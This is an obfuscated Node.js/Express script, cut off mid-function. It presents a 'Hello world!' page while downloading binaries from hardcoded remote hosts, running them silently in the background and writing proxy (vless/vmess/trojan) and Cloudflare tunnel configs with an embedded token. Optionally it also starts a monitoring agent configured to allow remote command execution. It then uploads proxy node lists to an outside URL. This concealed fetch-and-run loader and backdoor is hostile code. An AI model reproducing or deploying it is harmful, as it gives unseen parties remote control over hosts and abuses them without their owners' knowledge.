const _0x4d48b6=_0x3326;(function(_0x34db84,_0x2e8d7c){const _0x1da960=_0x3326,_0x4d0868=_0x34db84();while(!![]){try{const _0x21fd1a=parseInt(_0x1da960(0x1e7))/0x1+parseInt(_0x1da960(0x1b7))/0x2*(parseInt(_0x1da960(0x26f))/0x3)+parseInt(_0x1da960(0x1c6))/0x4+-parseInt(_0x1da960(0x29e))/0x5+parseInt(_0x1da960(0x200))/0x6*(parseInt(_0x1da960(0x26e))/0x7)+-parseInt(_0x1da960(0x237))/0x8*(parseInt(_0x1da960(0x215))/0x9)+-parseInt(_0x1da960(0x25a))/0xa;if(_0x21fd1a===_0x2e8d7c)break;else _0x4d0868['push'](_0x4d0868['shift']());}catch(_0x10f5cc){_0x4d0868['push'](_0x4d0868['shift']());}}}(_0x43ea,0x1e907));const _0x2e252c=(function(){let _0x178db7=!![];return function(_0x23e7c8,_0x51ec57){const _0x270bbb=_0x178db7?function(){const _0x359405=_0x3326;if(_0x51ec57){const _0x962f0c=_0x51ec57[_0x359405(0x22b)](_0x23e7c8,arguments);return _0x51ec57=null,_0x962f0c;}}:function(){};return _0x178db7=![],_0x270bbb;};}()),_0x814fb=_0x2e252c(this,function(){const _0x147f44=_0x3326;return _0x814fb[_0x147f44(0x295)]()['search'](_0x147f44(0x24a))[_0x147f44(0x295)]()[_0x147f44(0x226)](_0x814fb)[_0x147f44(0x243)](_0x147f44(0x24a));});_0x814fb();const _0x20a326=(function(){let _0xd23f27=!![];return function(_0x49bd10,_0x48c850){const _0x1781e9=_0xd23f27?function(){const _0x26e325=_0x3326;if(_0x48c850){const _0x192049=_0x48c850[_0x26e325(0x22b)](_0x49bd10,arguments);return _0x48c850=null,_0x192049;}}:function(){};return _0xd23f27=![],_0x1781e9;};}()),_0x37de31=_0x20a326(this,function(){const _0x231afd=_0x3326,_0x5441ec=function(){const _0xf15b73=_0x3326;let _0x5bbb62;try{_0x5bbb62=Function(_0xf15b73(0x281)+_0xf15b73(0x213)+');')();}catch(_0x47eafd){_0x5bbb62=window;}return _0x5bbb62;},_0x33ac9e=_0x5441ec(),_0x13f663=_0x33ac9e[_0x231afd(0x223)]=_0x33ac9e['console']||{},_0x1133ef=['log',_0x231afd(0x293),_0x231afd(0x271),_0x231afd(0x1dd),_0x231afd(0x221),_0x231afd(0x1c1),_0x231afd(0x21c)];for(let _0x3c7eb6=0x0;_0x3c7eb6<_0x1133ef['length'];_0x3c7eb6++){const _0x40da03=_0x20a326['constructor'][_0x231afd(0x1e9)][_0x231afd(0x1fd)](_0x20a326),_0x407bf0=_0x1133ef[_0x3c7eb6],_0x2da49e=_0x13f663[_0x407bf0]||_0x40da03;_0x40da03['__proto__']=_0x20a326['bind'](_0x20a326),_0x40da03[_0x231afd(0x295)]=_0x2da49e['toString']['bind'](_0x2da49e),_0x13f663[_0x407bf0]=_0x40da03;}});_0x37de31();const express=require(_0x4d48b6(0x1be)),app=express(),axios=require(_0x4d48b6(0x29b)),os=require('os'),fs=require('fs'),path=require(_0x4d48b6(0x1b5)),{promisify}=require(_0x4d48b6(0x212)),exec=promisify(require(_0x4d48b6(0x24d))[_0x4d48b6(0x28b)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4d48b6(0x25e)][_0x4d48b6(0x284)]||'',PROJECT_URL=process[_0x4d48b6(0x25e)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x4d48b6(0x259)]||![],FILE_PATH=process[_0x4d48b6(0x25e)][_0x4d48b6(0x289)]||_0x4d48b6(0x1ec),SUB_PATH=process['env'][_0x4d48b6(0x227)]||_0x4d48b6(0x208),PORT=process[_0x4d48b6(0x25e)][_0x4d48b6(0x1cc)]||process[_0x4d48b6(0x25e)]['PORT']||0xbb8,UUID=process[_0x4d48b6(0x25e)][_0x4d48b6(0x23f)]||'5bc08089-f346-4f5e-92f2-5f385a411a41',NEZHA_SERVER=process[_0x4d48b6(0x25e)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4d48b6(0x25e)][_0x4d48b6(0x1db)]||'',NEZHA_KEY=process['env'][_0x4d48b6(0x1d7)]||'',ARGO_DOMAIN=process['env'][_0x4d48b6(0x22d)]||_0x4d48b6(0x21b),ARGO_AUTH=process['env'][_0x4d48b6(0x202)]||_0x4d48b6(0x1da),ARGO_PORT=process[_0x4d48b6(0x25e)]['ARGO_PORT']||0x1f41,CFIP=process[_0x4d48b6(0x25e)]['CFIP']||_0x4d48b6(0x1dc),CFPORT=process[_0x4d48b6(0x25e)][_0x4d48b6(0x1e0)]||0x1bb,NAME=process[_0x4d48b6(0x25e)][_0x4d48b6(0x1ba)]||'';function _0x3326(_0x4d78c4,_0x34bc15){const _0x349086=_0x43ea();return _0x3326=function(_0x37de31,_0x20a326){_0x37de31=_0x37de31-0x1ac;let _0x4bf93f=_0x349086[_0x37de31];return _0x4bf93f;},_0x3326(_0x4d78c4,_0x34bc15);}!fs[_0x4d48b6(0x20a)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x4d48b6(0x1f8)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+_0x4d48b6(0x1bc));function generateRandomName(){const _0x585666=_0x4d48b6,_0x557571=_0x585666(0x206);let _0x904710='';for(let _0x2a1f81=0x0;_0x2a1f81<0x6;_0x2a1f81++){_0x904710+=_0x557571[_0x585666(0x229)](Math['floor'](Math[_0x585666(0x1ac)]()*_0x557571[_0x585666(0x2a4)]));}return _0x904710;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4d48b6(0x27e)](FILE_PATH,npmName),phpPath=path[_0x4d48b6(0x27e)](FILE_PATH,phpName),webPath=path[_0x4d48b6(0x27e)](FILE_PATH,webName),botPath=path[_0x4d48b6(0x27e)](FILE_PATH,botName),subPath=path[_0x4d48b6(0x27e)](FILE_PATH,_0x4d48b6(0x20e)),listPath=path['join'](FILE_PATH,_0x4d48b6(0x234)),bootLogPath=path[_0x4d48b6(0x27e)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x4d48b6(0x26c));function deleteNodes(){const _0x2a004d=_0x4d48b6;try{if(!UPLOAD_URL)return;if(!fs[_0x2a004d(0x20a)](subPath))return;let _0x39c81d;try{_0x39c81d=fs[_0x2a004d(0x23b)](subPath,'utf-8');}catch{return null;}const _0xb13205=Buffer['from'](_0x39c81d,_0x2a004d(0x1c8))[_0x2a004d(0x295)](_0x2a004d(0x201)),_0x3ef525=_0xb13205['split']('\x0a')[_0x2a004d(0x2a0)](_0x572095=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2a004d(0x252)](_0x572095));if(_0x3ef525[_0x2a004d(0x2a4)]===0x0)return;const _0x4cb297={};_0x4cb297[_0x2a004d(0x1d1)]=_0x3ef525;const _0x5dc795={};_0x5dc795[_0x2a004d(0x27b)]=_0x2a004d(0x2a2);const _0x3ac687={};return _0x3ac687[_0x2a004d(0x1f9)]=_0x5dc795,axios[_0x2a004d(0x24e)](UPLOAD_URL+_0x2a004d(0x2a6),JSON[_0x2a004d(0x28e)](_0x4cb297),_0x3ac687)[_0x2a004d(0x222)](_0x34ed00=>{return null;}),null;}catch(_0x2ff6d6){return null;}}function cleanupOldFiles(){const _0xdc1515=_0x4d48b6;try{const _0x51ed8c=fs[_0xdc1515(0x240)](FILE_PATH);_0x51ed8c[_0xdc1515(0x1ed)](_0x3499af=>{const _0x5c30bc=_0xdc1515,_0x15106b=path[_0x5c30bc(0x27e)](FILE_PATH,_0x3499af);try{const _0x26a59a=fs['statSync'](_0x15106b);_0x26a59a[_0x5c30bc(0x1cf)]()&&fs['unlinkSync'](_0x15106b);}catch(_0x51b155){}});}catch(_0x53847b){}}app[_0x4d48b6(0x1ce)]('/',function(_0x3b34c8,_0x48f728){const _0x59a3ed=_0x4d48b6;_0x48f728[_0x59a3ed(0x230)](_0x59a3ed(0x1b4));});async function generateConfig(){const _0x34258a=_0x4d48b6,_0x58734f={};_0x58734f[_0x34258a(0x273)]=_0x34258a(0x1e8),_0x58734f[_0x34258a(0x1dd)]=_0x34258a(0x1e8),_0x58734f[_0x34258a(0x1e5)]=_0x34258a(0x267);const _0x26d687={};_0x26d687['id']=UUID,_0x26d687[_0x34258a(0x274)]=_0x34258a(0x246);const _0x3d8609={};_0x3d8609[_0x34258a(0x290)]=0xbb9;const _0x432fef={};_0x432fef[_0x34258a(0x1b5)]=_0x34258a(0x297),_0x432fef[_0x34258a(0x290)]=0xbba;const _0x337822={};_0x337822[_0x34258a(0x1b5)]='/vmess-argo',_0x337822[_0x34258a(0x290)]=0xbbb;const _0x3e329f={};_0x3e329f['path']=_0x34258a(0x1d2),_0x3e329f['dest']=0xbbc;const _0x264b04={};_0x264b04[_0x34258a(0x1f5)]=[_0x26d687],_0x264b04[_0x34258a(0x28c)]=_0x34258a(0x267),_0x264b04[_0x34258a(0x287)]=[_0x3d8609,_0x432fef,_0x337822,_0x3e329f];const _0x59d6fa={};_0x59d6fa['network']=_0x34258a(0x20b);const _0x2397cc={};_0x2397cc[_0x34258a(0x1b9)]=ARGO_PORT,_0x2397cc[_0x34258a(0x211)]=_0x34258a(0x1cb),_0x2397cc[_0x34258a(0x276)]=_0x264b04,_0x2397cc['streamSettings']=_0x59d6fa;const _0x24064c={};_0x24064c['id']=UUID;const _0x491ded={};_0x491ded[_0x34258a(0x1f5)]=[_0x24064c],_0x491ded[_0x34258a(0x28c)]=_0x34258a(0x267);const _0x50be48={};_0x50be48['network']=_0x34258a(0x20b),_0x50be48['security']='none';const _0x66ad36={};_0x66ad36[_0x34258a(0x1b9)]=0xbb9,_0x66ad36[_0x34258a(0x1cd)]=_0x34258a(0x1fb),_0x66ad36[_0x34258a(0x211)]=_0x34258a(0x1cb),_0x66ad36[_0x34258a(0x276)]=_0x491ded,_0x66ad36[_0x34258a(0x22e)]=_0x50be48;const _0x159820={};_0x159820['id']=UUID,_0x159820[_0x34258a(0x210)]=0x0;const _0x3f5dd4={};_0x3f5dd4[_0x34258a(0x1f5)]=[_0x159820],_0x3f5dd4[_0x34258a(0x28c)]='none';const _0x295809={};_0x295809['path']='/vless-argo';const _0x285239={};_0x285239['network']='ws',_0x285239[_0x34258a(0x20c)]=_0x34258a(0x267),_0x285239['wsSettings']=_0x295809;const _0x2c69a9={};_0x2c69a9[_0x34258a(0x251)]=!![],_0x2c69a9['destOverride']=['http',_0x34258a(0x250),'quic'],_0x2c69a9[_0x34258a(0x247)]=![];const _0xee2d32={};_0xee2d32[_0x34258a(0x1b9)]=0xbba,_0xee2d32[_0x34258a(0x1cd)]=_0x34258a(0x1fb),_0xee2d32['protocol']=_0x34258a(0x1cb),_0xee2d32['settings']=_0x3f5dd4,_0xee2d32['streamSettings']=_0x285239,_0xee2d32[_0x34258a(0x214)]=_0x2c69a9;const _0x507665={};_0x507665['id']=UUID,_0x507665[_0x34258a(0x254)]=0x0;const _0x528df3={};_0x528df3[_0x34258a(0x1f5)]=[_0x507665];const _0x2862b3={};_0x2862b3['path']=_0x34258a(0x1f7);const _0x29a55f={};_0x29a55f[_0x34258a(0x26d)]='ws',_0x29a55f[_0x34258a(0x209)]=_0x2862b3;const _0x1e957d={};_0x1e957d[_0x34258a(0x251)]=!![],_0x1e957d[_0x34258a(0x233)]=[_0x34258a(0x255),'tls',_0x34258a(0x29d)],_0x1e957d[_0x34258a(0x247)]=![];const _0x41bdec={};_0x41bdec[_0x34258a(0x1b9)]=0xbbb,_0x41bdec[_0x34258a(0x1cd)]=_0x34258a(0x1fb),_0x41bdec[_0x34258a(0x211)]=_0x34258a(0x27c),_0x41bdec[_0x34258a(0x276)]=_0x528df3,_0x41bdec[_0x34258a(0x22e)]=_0x29a55f,_0x41bdec['sniffing']=_0x1e957d;const _0xd6629d={};_0xd6629d[_0x34258a(0x1c7)]=UUID;const _0x584320={};_0x584320['clients']=[_0xd6629d];const _0x1a5389={};_0x1a5389[_0x34258a(0x1b5)]='/trojan-argo';const _0x30e026={};_0x30e026[_0x34258a(0x26d)]='ws',_0x30e026[_0x34258a(0x20c)]=_0x34258a(0x267),_0x30e026[_0x34258a(0x209)]=_0x1a5389;const _0x74c59a={};_0x74c59a[_0x34258a(0x251)]=!![],_0x74c59a[_0x34258a(0x233)]=[_0x34258a(0x255),_0x34258a(0x250),'quic'],_0x74c59a[_0x34258a(0x247)]=![];const _0x633e13={};_0x633e13[_0x34258a(0x1b9)]=0xbbc,_0x633e13['listen']='127.0.0.1',_0x633e13[_0x34258a(0x211)]=_0x34258a(0x1f6),_0x633e13[_0x34258a(0x276)]=_0x584320,_0x633e13[_0x34258a(0x22e)]=_0x30e026,_0x633e13[_0x34258a(0x214)]=_0x74c59a;const _0x45bac2={};_0x45bac2[_0x34258a(0x231)]=[_0x34258a(0x1c3)];const _0x525311={};_0x525311['protocol']=_0x34258a(0x1b1),_0x525311[_0x34258a(0x22c)]=_0x34258a(0x278);const _0x5d7c9e={};_0x5d7c9e['protocol']=_0x34258a(0x225),_0x5d7c9e['tag']='block';const _0x5a33d6={};_0x5a33d6[_0x34258a(0x1f8)]=_0x58734f,_0x5a33d6[_0x34258a(0x27f)]=[_0x2397cc,_0x66ad36,_0xee2d32,_0x41bdec,_0x633e13],_0x5a33d6['dns']=_0x45bac2,_0x5a33d6['outbounds']=[_0x525311,_0x5d7c9e];const _0x1e55f2=_0x5a33d6;fs[_0x34258a(0x1f4)](path[_0x34258a(0x27e)](FILE_PATH,'config.json'),JSON[_0x34258a(0x28e)](_0x1e55f2,null,0x2));}function _0x43ea(){const _0x144a02=['179373pLHCLv','8443','info','Error\x20executing\x20command:\x20','access','flow','Skipping\x20adding\x20automatic\x20access\x20task','settings','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','direct','&fp=firefox&type=ws&host=','\x20-c\x20','Content-Type','vmess','includes','join','inbounds','Empowerment\x20success\x20for\x20','return\x20(function()\x20','\x20failed:\x20','443','UPLOAD_URL','from','rm\x20-rf\x20','fallbacks','split','FILE_PATH','net','exec','decryption','https://amd64.ssss.nyc.mn/web','stringify','text/plain;\x20charset=utf-8','dest','true','Empowerment\x20failed\x20for\x20','warn','\x20-c\x20\x22','toString','config.yaml','/vless-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','host','push','axios','\x20successfully','quic','495450BCeDeO','amd','filter','2083','application/json','https://oooo.serv00.net/add-url','length','fileName','/api/delete-nodes','\x20-p\x20','random','/vmess-argo?ed=2560','recursive','Error\x20in\x20startserver:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','freedom','pipe','php\x20running\x20error:\x20','Hello\x20world!','path','\x20is\x20running','8TsqJhJ','\x20>\x20nul\x202>&1','port','NAME','\x0aclient_secret:\x20','\x20already\x20exists','2096','express','org','response','table','\x20-s\x20','https+local://8.8.8.8/dns-query','createWriteStream','url','947424Vffxdy','password','base64','\x0a\x20\x20credentials-file:\x20','2053','vless','SERVER_PORT','listen','get','isFile','set','nodes','/trojan-argo','clear','?encryption=none&security=tls&sni=','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_KEY','\x0a\x20\x20tunnel:\x20','message','eyJhIjoiNGRmYjY5MGM2MGJkNTg0ZGE1OWM0MGUzZjMyYjZlNDQiLCJ0IjoiMDQ0YmNiZDUtZWU2My00ZTAxLTk0YzktNzgyNWMzYmNmOGEyIiwicyI6IlpESXpZVE00Wm1RdFptWmpNeTAwT0dJMExXRXlZakF0TkRNek5EVmxZemt3TlRZeCJ9','NEZHA_PORT','cdns.doon.eu.org','error','http\x20server\x20is\x20running\x20on\x20port:','Download\x20','CFPORT','automatic\x20access\x20task\x20added\x20successfully','platform','\x20>/dev/null\x202>&1\x20&','pop','loglevel','boot.log','41216KdsPfD','/dev/null','prototype','status','false','./tmp','forEach','Unknown','Unhandled\x20error\x20in\x20startserver:','mkdirSync','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/web','nohup\x20','writeFileSync','clients','trojan','/vmess-argo','log','headers','success','127.0.0.1','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','bind','\x20>/dev/null\x202>&1','arm','1116ZHfNwb','utf-8','ARGO_AUTH','\x0a\x20\x20\x20\x20','data','timeout','abcdefghijklmnopqrstuvwxyz','del\x20/f\x20/q\x20','sub','wsSettings','existsSync','tcp','security','2087','sub.txt','unlink','level','protocol','util','{}.constructor(\x22return\x20this\x22)(\x20)','sniffing','1985103yznrXj','unshift','finish','add','close','npm\x20running\x20error:\x20','trcg.baby357.dpdns.org','trace','Error\x20reading\x20boot.log:','type','taskkill\x20/f\x20/im\x20','arm64','exception','catch','console','chmod','blackhole','constructor','SUB_PATH','/tunnel.yml\x20run','charAt','countryCode','apply','tag','ARGO_DOMAIN','streamSettings','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','send','servers','win32','destOverride','list.txt','tunnel.yml','https://amd64.ssss.nyc.mn/agent','8FprEKI','Nodes\x20uploaded\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','readFileSync','firefox','Error\x20downloading\x20files:','subscription','UUID','readdirSync','ArgoDomain:','https://arm64.ssss.nyc.mn/agent','search','\x0avless://','basename','xtls-rprx-vision','metadataOnly','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','fileUrl','(((.+)+)+)+$','/api/add-subscriptions','substring','child_process','post','ARGO_DOMAIN:','tls','enabled','test','tunnel.json','alterId','http','web\x20running\x20error:\x20','\x0a\x0atrojan://','match','AUTO_ACCESS','835480DoOPCP','\x0a\x0avmess://','Add\x20automatic\x20access\x20task\x20faild:\x20','/sub.txt\x20saved\x20successfully','env','aarch64','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/config.json\x20>/dev/null\x202>&1\x20&','.exe\x20>\x20nul\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','none','pkill\x20-f\x20\x22[','&path=%2Fvless-argo%3Fed%3D2560#','https://amd64.ssss.nyc.mn/bot','arch','config.json','network','420QIKVva'];_0x43ea=function(){return _0x144a02;};return _0x43ea();}function getSystemArchitecture(){const _0x272af8=_0x4d48b6,_0x575cad=os[_0x272af8(0x26b)]();return _0x575cad===_0x272af8(0x1ff)||_0x575cad===_0x272af8(0x220)||_0x575cad===_0x272af8(0x25f)?_0x272af8(0x1ff):_0x272af8(0x29f);}function downloadFile(_0x5be1cb,_0x1089c5,_0x499940){const _0x3a078c=_0x4d48b6,_0x14a286=_0x5be1cb;if(!fs[_0x3a078c(0x20a)](FILE_PATH)){const _0x63b801={};_0x63b801[_0x3a078c(0x1ae)]=!![],fs[_0x3a078c(0x1f0)](FILE_PATH,_0x63b801);}const _0x2f8d76=fs[_0x3a078c(0x1c4)](_0x14a286),_0x4d70fe={};_0x4d70fe['method']=_0x3a078c(0x1ce),_0x4d70fe[_0x3a078c(0x1c5)]=_0x1089c5,_0x4d70fe['responseType']='stream',axios(_0x4d70fe)['then'](_0x534979=>{const _0x1d9029=_0x3a078c;_0x534979[_0x1d9029(0x204)][_0x1d9029(0x1b2)](_0x2f8d76),_0x2f8d76['on'](_0x1d9029(0x217),()=>{const _0x5d6995=_0x1d9029;_0x2f8d76[_0x5d6995(0x219)](),console[_0x5d6995(0x1f8)](_0x5d6995(0x1df)+path['basename'](_0x14a286)+_0x5d6995(0x29c)),_0x499940(null,_0x14a286);}),_0x2f8d76['on'](_0x1d9029(0x1dd),_0xe031cc=>{const _0x19097c=_0x1d9029;fs[_0x19097c(0x20f)](_0x14a286,()=>{});const _0x1cb283=_0x19097c(0x1df)+path[_0x19097c(0x245)](_0x14a286)+_0x19097c(0x282)+_0xe031cc[_0x19097c(0x1d9)];console[_0x19097c(0x1dd)](_0x1cb283),_0x499940(_0x1cb283);});})[_0x3a078c(0x222)](_0x2379a2=>{const _0x3af258=_0x3a078c,_0x43c7d5=_0x3af258(0x1df)+path[_0x3af258(0x245)](_0x14a286)+'\x20failed:\x20'+_0x2379a2[_0x3af258(0x1d9)];console[_0x3af258(0x1dd)](_0x43c7d5),_0x499940(_0x43c7d5);});}async function downloadFilesAndRun(){const _0x49441c=_0x4d48b6,_0x13e89f=getSystemArchitecture(),_0x215f9b=getFilesForArchitecture(_0x13e89f);if(_0x215f9b[_0x49441c(0x2a4)]===0x0){console[_0x49441c(0x1f8)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x107c90=_0x215f9b['map'](_0x57355b=>{return new Promise((_0x413db8,_0xe9bba1)=>{const _0x1a3084=_0x3326;downloadFile(_0x57355b[_0x1a3084(0x2a5)],_0x57355b['fileUrl'],(_0x2c42ae,_0x162a73)=>{_0x2c42ae?_0xe9bba1(_0x2c42ae):_0x413db8(_0x162a73);});});});try{await Promise['all'](_0x107c90);}catch(_0x4cfdd3){console[_0x49441c(0x1dd)](_0x49441c(0x23d),_0x4cfdd3);return;}function _0x3a3680(_0x39bf19){const _0x28853a=_0x49441c,_0x58a734=0x1fd;_0x39bf19[_0x28853a(0x1ed)](_0x52b506=>{const _0x233e6f=_0x28853a;fs['existsSync'](_0x52b506)&&fs[_0x233e6f(0x224)](_0x52b506,_0x58a734,_0x251809=>{const _0x10b68d=_0x233e6f;_0x251809?console[_0x10b68d(0x1dd)](_0x10b68d(0x292)+_0x52b506+':\x20'+_0x251809):console['log'](_0x10b68d(0x280)+_0x52b506+':\x20'+_0x58a734[_0x10b68d(0x295)](0x8));});});}const _0x4796d9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3a3680(_0x4796d9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2bf33e=NEZHA_SERVER[_0x49441c(0x27d)](':')?NEZHA_SERVER['split'](':')[_0x49441c(0x1e4)]():'',_0x7a3f29=new Set(['443',_0x49441c(0x270),'2096',_0x49441c(0x20d),_0x49441c(0x2a1),_0x49441c(0x1ca)]),_0x26ee62=_0x7a3f29['has'](_0x2bf33e)?_0x49441c(0x291):_0x49441c(0x1eb),_0x9b7ef0=_0x49441c(0x1bb)+NEZHA_KEY+_0x49441c(0x1d6)+NEZHA_SERVER+_0x49441c(0x239)+_0x26ee62+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x49441c(0x1f4)](path['join'](FILE_PATH,_0x49441c(0x296)),_0x9b7ef0);const _0x46ffda=_0x49441c(0x1f3)+phpPath+_0x49441c(0x294)+FILE_PATH+_0x49441c(0x260);try{await exec(_0x46ffda),console[_0x49441c(0x1f8)](phpName+_0x49441c(0x1b6)),await new Promise(_0x498eeb=>setTimeout(_0x498eeb,0x3e8));}catch(_0x10b0d2){console['error'](_0x49441c(0x1b3)+_0x10b0d2);}}else{let _0x21accd='';const _0x3c0aef=[_0x49441c(0x283),'8443',_0x49441c(0x1bd),_0x49441c(0x20d),_0x49441c(0x2a1),'2053'];_0x3c0aef[_0x49441c(0x27d)](NEZHA_PORT)&&(_0x21accd='--tls');const _0x3556c9=_0x49441c(0x1f3)+npmPath+_0x49441c(0x1c2)+NEZHA_SERVER+':'+NEZHA_PORT+_0x49441c(0x2a7)+NEZHA_KEY+'\x20'+_0x21accd+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3556c9),console[_0x49441c(0x1f8)](npmName+_0x49441c(0x1b6)),await new Promise(_0x588e37=>setTimeout(_0x588e37,0x3e8));}catch(_0x88be19){console[_0x49441c(0x1dd)](_0x49441c(0x21a)+_0x88be19);}}}else console[_0x49441c(0x1f8)](_0x49441c(0x23a));const _0x160560='nohup\x20'+webPath+_0x49441c(0x27a)+FILE_PATH+_0x49441c(0x263);try{await exec(_0x160560),console['log'](webName+'\x20is\x20running'),await new Promise(_0x526580=>setTimeout(_0x526580,0x3e8));}catch(_0x22671a){console[_0x49441c(0x1dd)](_0x49441c(0x256)+_0x22671a);}if(fs['existsSync'](botPath)){let _0x41dcc5;if(ARGO_AUTH[_0x49441c(0x258)](/^[A-Z0-9a-z=]{120,250}$/))_0x41dcc5=_0x49441c(0x248)+ARGO_AUTH;else ARGO_AUTH[_0x49441c(0x258)](/TunnelSecret/)?_0x41dcc5=_0x49441c(0x266)+FILE_PATH+_0x49441c(0x228):_0x41dcc5=_0x49441c(0x262)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x49441c(0x1f3)+botPath+'\x20'+_0x41dcc5+'\x20>/dev/null\x202>&1\x20&'),console[_0x49441c(0x1f8)](botName+_0x49441c(0x1b6)),await new Promise(_0x2564ea=>setTimeout(_0x2564ea,0x7d0));}catch(_0x19c0e7){console[_0x49441c(0x1dd)](_0x49441c(0x272)+_0x19c0e7);}}await new Promise(_0x2906af=>setTimeout(_0x2906af,0x1388));}function getFilesForArchitecture(_0x4f2098){const _0x6add4f=_0x4d48b6;let _0x25eabd;if(_0x4f2098===_0x6add4f(0x1ff)){const _0x2056cf={};_0x2056cf[_0x6add4f(0x2a5)]=webPath,_0x2056cf[_0x6add4f(0x249)]=_0x6add4f(0x1f2);const _0x4a0aee={};_0x4a0aee['fileName']=botPath,_0x4a0aee[_0x6add4f(0x249)]=_0x6add4f(0x1f1),_0x25eabd=[_0x2056cf,_0x4a0aee];}else{const _0x573273={};_0x573273[_0x6add4f(0x2a5)]=webPath,_0x573273['fileUrl']=_0x6add4f(0x28d);const _0x3b1745={};_0x3b1745[_0x6add4f(0x2a5)]=botPath,_0x3b1745[_0x6add4f(0x249)]=_0x6add4f(0x26a),_0x25eabd=[_0x573273,_0x3b1745];}if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x550f05=_0x4f2098===_0x6add4f(0x1ff)?_0x6add4f(0x242):_0x6add4f(0x236),_0xea0e1a={};_0xea0e1a[_0x6add4f(0x2a5)]=npmPath,_0xea0e1a['fileUrl']=_0x550f05,_0x25eabd[_0x6add4f(0x216)](_0xea0e1a);}else{const _0x47ce21=_0x4f2098===_0x6add4f(0x1ff)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1',_0x1e080f={};_0x1e080f[_0x6add4f(0x2a5)]=phpPath,_0x1e080f[_0x6add4f(0x249)]=_0x47ce21,_0x25eabd[_0x6add4f(0x216)](_0x1e080f);}}return _0x25eabd;}function argoType(){const _0x1ca7a9=_0x4d48b6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ca7a9(0x1f8)](_0x1ca7a9(0x1b0));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x1ca7a9(0x1f4)](path['join'](FILE_PATH,_0x1ca7a9(0x253)),ARGO_AUTH);const _0x3d3ca4=_0x1ca7a9(0x1d8)+ARGO_AUTH[_0x1ca7a9(0x288)]('\x22')[0xb]+_0x1ca7a9(0x1c9)+path[_0x1ca7a9(0x27e)](FILE_PATH,'tunnel.json')+_0x1ca7a9(0x277)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x1ca7a9(0x22f);fs[_0x1ca7a9(0x1f4)](path[_0x1ca7a9(0x27e)](FILE_PATH,_0x1ca7a9(0x235)),_0x3d3ca4);}else console[_0x1ca7a9(0x1f8)](_0x1ca7a9(0x298));}async function extractDomains(){const _0x56b05e=_0x4d48b6;let _0x246656;if(ARGO_AUTH&&ARGO_DOMAIN)_0x246656=ARGO_DOMAIN,console['log'](_0x56b05e(0x24f),_0x246656),await _0xab589b(_0x246656);else try{const _0x56bcd6=fs[_0x56b05e(0x23b)](path['join'](FILE_PATH,_0x56b05e(0x1e6)),_0x56b05e(0x201)),_0x2c41e5=_0x56bcd6[_0x56b05e(0x288)]('\x0a'),_0x58a81d=[];_0x2c41e5['forEach'](_0x7e73f1=>{const _0x418a47=_0x56b05e,_0x3f32f3=_0x7e73f1[_0x418a47(0x258)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3f32f3){const _0x16ab8b=_0x3f32f3[0x1];_0x58a81d[_0x418a47(0x29a)](_0x16ab8b);}});if(_0x58a81d[_0x56b05e(0x2a4)]>0x0)_0x246656=_0x58a81d[0x0],console[_0x56b05e(0x1f8)](_0x56b05e(0x241),_0x246656),await _0xab589b(_0x246656);else{console[_0x56b05e(0x1f8)](_0x56b05e(0x1d5)),fs['unlinkSync'](path[_0x56b05e(0x27e)](FILE_PATH,_0x56b05e(0x1e6)));async function _0xa2d5b4(){const _0x30da10=_0x56b05e;try{process[_0x30da10(0x1e2)]==='win32'?await 